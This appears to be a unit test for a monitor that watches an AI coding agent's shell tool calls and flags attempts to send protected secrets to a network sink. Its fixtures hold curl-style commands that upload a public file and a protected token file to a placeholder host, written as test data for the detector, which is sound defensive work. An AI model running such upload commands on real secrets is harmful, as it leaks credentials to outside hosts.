from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from hook_monitor.analysis.sink_payload_evidence import (
    BashSinkPayloadEvidence,
    SinkPayloadSourceMatch,
)
from hook_monitor.runtime.parser import normalize_event
from hook_monitor.runtime.sink_payload_shadow import (
    build_sink_payload_shadow_observation,
    store_sink_payload_shadow_observations,
)
from hook_monitor.runtime.storage import EventStore
from scripts.manual_sink_payload_shadow import (
    CASE_ID,
    PROTECTED_FILE,
    PROTECTED_MARKER,
    PUBLIC_FILE,
    PUBLIC_MARKER,
    SURFACE_DESKTOP,
    SURFACE_TUI,
    desktop_preflight,
    prepare_shadow_dogfood,
    verify_shadow_dogfood,
)


class ManualSinkPayloadShadowTest(unittest.TestCase):
    def test_desktop_preflight_does_not_claim_tui_equivalence(self) -> None:
        result = desktop_preflight()

        self.assertEqual("unsupported", result["status"])
        self.assertEqual(SURFACE_DESKTOP, result["surface"])
        self.assertFalse(result["shared_codex_home_mutated"])
        self.assertFalse(result["tui_result_reused"])
        with tempfile.TemporaryDirectory() as temporary_directory:
            prepared = prepare_shadow_dogfood(
                Path(temporary_directory) / "unused",
                surface=SURFACE_DESKTOP,
            )
        self.assertEqual("unsupported", prepared["status"])

    def test_prepare_reuses_isolated_plugin_environment_and_enables_shadow(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory) / "shadow"
            base = self._base_prepare(root)
            with (
                patch(
                    "scripts.manual_sink_payload_shadow.prepare_phase_b",
                    return_value=base,
                ),
                patch(
                    "scripts.manual_sink_payload_shadow._run_json",
                    return_value={"status": "initialized"},
                ),
            ):
                result = prepare_shadow_dogfood(
                    root,
                    surface=SURFACE_TUI,
                )

            self.assertEqual("prepared", result["status"])
            self.assertEqual(CASE_ID, result["case_id"])
            launcher = (root / "launch-codex.sh").read_text(encoding="utf-8")
            self.assertIn(
                "TOOLUSEPROXY_PRE_TOOL_FILE_PAYLOAD_SHADOW=1",
                launcher,
            )
            prompt = (root / "phase-b-prompt.txt").read_text(encoding="utf-8")
            self.assertIn(f"@{PUBLIC_FILE}", prompt)
            self.assertIn(f"@{PROTECTED_FILE}", prompt)
            self.assertNotIn("PHASE.B.CANARY", prompt)
            manifest = json.loads(
                (root / "workspace" / "protected_sources.json").read_text()
            )
            self.assertEqual(
                ["PHASE_B_TOKEN"],
                manifest["sources"][0]["selector"]["dotenv_keys"],
            )
            state = json.loads((root / "phase-b-state.json").read_text())
            self.assertEqual(CASE_ID, state["case_id"])

    def test_verify_requires_two_allowed_calls_and_opposite_shadow_results(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory) / "shadow"
            workspace = root / "workspace"
            codex_home = root / "codex-home"
            plugin_data = root / "plugin-data"
            fake_sink = root / "bin" / "curl"
            for directory in (
                workspace,
                codex_home / "sessions",
                plugin_data,
                fake_sink.parent,
            ):
                directory.mkdir(parents=True, exist_ok=True)
            workspace = workspace.resolve()
            codex_home = codex_home.resolve()
            plugin_data = plugin_data.resolve()
            fake_sink = fake_sink.resolve()
            fake_sink.write_text("#!/bin/sh\n", encoding="utf-8")
            fake_sink.chmod(0o700)
            (workspace / PUBLIC_MARKER).write_text("invoked\n", encoding="utf-8")
            (workspace / PROTECTED_MARKER).write_text(
                "invoked\n",
                encoding="utf-8",
            )
            state = {
                "case_id": CASE_ID,
                "surface": SURFACE_TUI,
                "workspace": str(workspace),
                "codex_home": str(codex_home),
                "plugin_data": str(plugin_data),
                "fake_sink": str(fake_sink),
                "fake_sink_sha256": self._sha256(fake_sink),
            }
            (root / "phase-b-state.json").write_text(
                json.dumps(state),
                encoding="utf-8",
            )
            store = EventStore(plugin_data / "events.db")
            store.initialize()
            public_pre, public_post = self._record_pair(
                store,
                workspace,
                tool_use_id="public-call",
                command=self._command(fake_sink, PUBLIC_FILE),
            )
            protected_pre, protected_post = self._record_pair(
                store,
                workspace,
                tool_use_id="protected-call",
                command=self._command(fake_sink, PROTECTED_FILE),
            )
            self.assertIsNotNone(public_post)
            self.assertIsNotNone(protected_post)
            store_sink_payload_shadow_observations(
                store.db_path,
                (
                    self._observation(
                        public_pre.event_id,
                        "public-call",
                        "analysis-public",
                        "sink-public",
                        matched=False,
                    ),
                    self._observation(
                        protected_pre.event_id,
                        "protected-call",
                        "analysis-protected",
                        "sink-protected",
                        matched=True,
                    ),
                ),
            )
            session = codex_home / "sessions" / "rollout-shadow.jsonl"
            session.write_text(
                "\n".join(
                    [
                        json.dumps(
                            {
                                "type": "session_meta",
                                "payload": {"cwd": str(workspace)},
                            }
                        ),
                        self._session_call(
                            "public-call",
                            self._command(fake_sink, PUBLIC_FILE),
                        ),
                        self._session_output("public-call"),
                        self._session_call(
                            "protected-call",
                            self._command(fake_sink, PROTECTED_FILE),
                        ),
                        self._session_output("protected-call"),
                    ]
                )
                + "\n",
                encoding="utf-8",
            )

            result = verify_shadow_dogfood(root)

        self.assertEqual("passed", result["status"], result)
        self.assertEqual([], result["failed_checks"])
        self.assertEqual(
            {"allow->would_allow": 1, "allow->would_block": 1},
            result["metrics"]["decision_diff"],
        )
        self.assertNotIn("PHASE.B.CANARY", json.dumps(result))

    @staticmethod
    def _base_prepare(root: Path) -> dict[str, object]:
        workspace = root / "workspace"
        plugin_root = root / "plugin"
        plugin_data = root / "plugin-data"
        fake_sink = root / "bin" / "curl"
        for directory in (
            workspace,
            plugin_root,
            plugin_data,
            fake_sink.parent,
        ):
            directory.mkdir(parents=True, exist_ok=True)
        (plugin_root / "tooluseproxy_plugin.py").write_text(
            "",
            encoding="utf-8",
        )
        fake_sink.write_text("#!/bin/sh\n", encoding="utf-8")
        fake_sink.chmod(0o700)
        (root / "launch-codex.sh").write_text(
            "#!/bin/sh\n"
            "export TOOLUSEPROXY_PRE_TOOL_MCP_POLICY=1\n",
            encoding="utf-8",
        )
        state = {
            "workspace": str(workspace),
            "codex_home": str(root / "codex-home"),
            "plugin_root": str(plugin_root),
            "plugin_data": str(plugin_data),
            "fake_sink": str(fake_sink),
            "fake_sink_sha256": "old",
            "plugin_version": "fixture",
            "codex_version": "fixture",
            "artifact_sha256": "fixture",
        }
        (root / "phase-b-state.json").write_text(
            json.dumps(state),
            encoding="utf-8",
        )
        return {
            "local_only": {
                "root": str(root),
                "login_command": "login",
                "device_login_command": "device-login",
                "logout_command": "logout",
                "launch_command": "launch",
            }
        }

    @staticmethod
    def _record_pair(
        store: EventStore,
        workspace: Path,
        *,
        tool_use_id: str,
        command: str,
    ):
        common = {
            "session_id": "shadow-session",
            "turn_id": "shadow-turn",
            "tool_use_id": tool_use_id,
            "tool_name": "Bash",
            "cwd": str(workspace),
            "tool_input": {"command": command},
        }
        pre = normalize_event(
            "pre_tool_use",
            common,
            workspace_root=str(workspace),
        )
        post = normalize_event(
            "post_tool_use",
            {**common, "tool_response": {"exit_code": 0}},
            workspace_root=str(workspace),
        )
        store.record(pre, [], [])
        store.record(post, [], [])
        return pre, post

    @staticmethod
    def _observation(
        event_id: str,
        tool_use_id: str,
        analysis_run_id: str,
        sink_node_id: str,
        *,
        matched: bool,
    ):
        matches = (
            (
                SinkPayloadSourceMatch(
                    source_node_kind="source_chunk",
                    source_node_id="source-private",
                    evidence_level="content_exact",
                    method="resolved_payload_exact_substring",
                    score=1.0,
                ),
            )
            if matched
            else ()
        )
        evidence = BashSinkPayloadEvidence(
            workspace_id="workspace",
            sink_node_id=sink_node_id,
            segment_index=0,
            resolution_status="evaluated",
            comparison_status="evaluated",
            extraction="resolved_file",
            snapshot_semantics="pre_execution_file_snapshot",
            resolver_version="resolver",
            evidence_version="evidence",
            submitted_value_count=1,
            submitted_bytes=32,
            matches=matches,
            resolution_reason=None,
            comparison_reason=None,
            inspection_duration_ms=1.0,
        )
        observation = build_sink_payload_shadow_observation(
            evidence,
            pre_event_id=event_id,
            analysis_run_id=analysis_run_id,
            session_id="shadow-session",
            tool_use_id=tool_use_id,
            baseline_action="allow",
        )
        assert observation is not None
        return observation

    @staticmethod
    def _command(fake_sink: Path, file_name: str) -> str:
        return (
            f"{fake_sink} --data-binary @{file_name} "
            "https://example.invalid"
        )

    @staticmethod
    def _session_call(call_id: str, command: str) -> str:
        return json.dumps(
            {
                "type": "response_item",
                "payload": {
                    "type": "function_call",
                    "call_id": call_id,
                    "arguments": json.dumps({"cmd": command}),
                },
            }
        )

    @staticmethod
    def _session_output(call_id: str) -> str:
        return json.dumps(
            {
                "type": "response_item",
                "payload": {
                    "type": "function_call_output",
                    "call_id": call_id,
                    "output": "",
                },
            }
        )

    @staticmethod
    def _sha256(path: Path) -> str:
        import hashlib

        return hashlib.sha256(path.read_bytes()).hexdigest()


if __name__ == "__main__":
    unittest.main()
